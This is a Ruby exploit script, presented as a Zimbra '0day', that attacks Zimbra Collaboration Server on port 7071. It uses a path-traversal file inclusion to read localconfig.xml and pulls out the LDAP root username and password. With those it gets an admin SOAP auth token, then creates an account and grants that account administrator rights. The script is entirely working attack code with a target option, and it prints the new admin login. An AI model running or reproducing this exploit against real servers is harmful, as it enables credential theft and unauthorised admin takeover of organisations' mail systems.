# /usr/bin/ruby
#
# Author: Eduardo Rubina H.
# Email : rubina119[at]gmail.com
# Date  : 03 Dec 2013
# State : Critical
# 
# Description : This script exploits a Local File Inclusion in /res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz which allows us to see localconfig.xml
# that contains LDAP root credentials wich allow us to make requests in /service/admin/soap API with the stolen LDAP credentials to create user with administration privlegies 
# and a lot of stuff also the lfi leets you see .bash_history, ssh pub keys, config files, etc.
# 
# 
# LFI : /res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../opt/zimbra/conf/localconfig.xml%00
# 
#

require 'net/https'
require 'getoptlong'
require './ultils.rb'

data = nil

def exploit_begin()
puts "[+] Looking if host is vuln..."
http = Net::HTTP.new( $host, 7071 )

http.use_ssl = true
http.verify_mode = OpenSSL::SSL::VERIFY_NONE

req = Net::HTTP::Get.new( "/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../opt/zimbra/conf/localconfig.xml%00", { "Accept-Encoding" => "gzip", "User-Agent" => "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36" } )
res = http.request( req )  

case res
  when Net::HTTPSuccess then  
    begin
      if res.header[ 'Content-Encoding' ].eql?( 'gzip' ) then
        sio = StringIO.new( res.body )
        gz = Zlib::GzipReader.new( sio )
		puts "[+] Host is vuln exploiting"
        resbody = gz.read()
        
        part1 = resbody.gsub("\n", ' ').squeeze(' ')
        part2 = part1.gsub("a[", '').squeeze(' ')
        ldap_user = part2.match(/name=\\"zimbra_user\\">"; "<value>(.*?)<\/value>/ui)[1]
        ldap_pass = part2.match(/name=\\"zimbra_ldap_password\\">"; "<value>(.*?)<\/value>/ui)[1]
        
        get_auth_token(ldap_user,ldap_pass)
        
        else
        puts "[-] Host is not vulnerable !"
        return false
  end
  rescue Exception
     #puts "[-] Connection Failed !"
     return false
  end
end
 
end

def get_auth_token(user,pass)

https = Net::HTTP.new( $host, 7071 )
path = "/service/admin/soap"

https.use_ssl = true
https.verify_mode = OpenSSL::SSL::VERIFY_NONE

body = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<env:Envelope xmlns:env=\"http://www.w3.org/2003/05/soap-envelope\" xmlns:ns1=\"urn:zimbraAdmin\" xmlns:ns2=\"urn:zimbraAdmin\"><env:Header><ns2:context/></env:Header><env:Body><ns1:AuthRequest><account by=\"name\">#{user}</account><password>#{pass}</password></ns1:AuthRequest></env:Body></env:Envelope>"
data = https.post(path, body, { "Content-Type" => "application/soap+xml; charset=utf-8; action=\"urn:zimbraAdmin#AuthRequest\"" } )
$auth_key = data.body.match(/<authToken>(.*)<\/authToken>/iu)[1]
exploit()

end

def exploit()

puts "[+] Obtaining Domain Name"
get_domain_soap_data = "<GetAllDomainsRequest xmlns=\"urn:zimbraAdmin\"></GetAllDomainsRequest>"
get_domain = Utils.new.request_soap_admin(get_domain_soap_data)
domain = get_domain.match(/<a n=\"zimbraDomainName\">(.*?)<\/a>/iu)[1]

puts "[+] Creating Account"
create_account_soap_data = "<CreateAccountRequest xmlns=\"urn:zimbraAdmin\"><name>#{$user}@#{domain}</name><password>#{$password}</password></CreateAccountRequest>"
create_account = Utils.new.request_soap_admin(create_account_soap_data)
a_id = create_account.match(/account id="(.*)" name="/ui)[1]

puts "[+] Elevating Privileges"
elevate_privs_soap_data = "<ModifyAccountRequest xmlns=\"urn:zimbraAdmin\"><id>#{a_id}</id><a n=\"zimbraIsAdminAccount\">TRUE</a></ModifyAccountRequest>"
elevate_privs = Utils.new.request_soap_admin(elevate_privs_soap_data)

puts "[+] Login Credentials"
puts "    [*] Login URL : https://#{domain}:7071/zimbraAdmin/ "           
puts "    [*] Account   : #{$user}@#{domain}"
puts "    [*] Password  : #{$password}"
puts "[+] Successfully Exploited !"

end

def usage
		print( "
             -t, --target
		         Host to attack ip or domain

             -u, --useraccount
		         The user name to be used to create the account, only alfanumeric chars.
             
             -p, --password
                 Password that will be used to create the account,
                 pass needs to be alfanumeric upercase and lowercase and special chars, minchar(8).

             -h, --help
		         Print this help message         
		         
		         
"
	)
end


puts ""
puts ""
puts "#########################################################################################"
puts "Zimbra Email Collaboration Server 0day Exploit by rubina119"
puts "#########################################################################################"
puts ""
puts ""

opts = GetoptLong.new(

      	[ '--target', '-t', GetoptLong::REQUIRED_ARGUMENT ],
      	[ '--useraccount','-u', GetoptLong::REQUIRED_ARGUMENT ],
    	[ '--password','-p', GetoptLong::REQUIRED_ARGUMENT ],
    	[ '--help','-h', GetoptLong::OPTIONAL_ARGUMENT ]
    )
opts.each do |opt, arg|
	case opt
		    when '--help'
			  usage()
        	when '--target'
			  $host = arg
     		when '--useraccount'
			  $user = arg
			when '--password'
			  $password = arg
end
end

if $host == nil

usage()

else

exploit_begin()

end



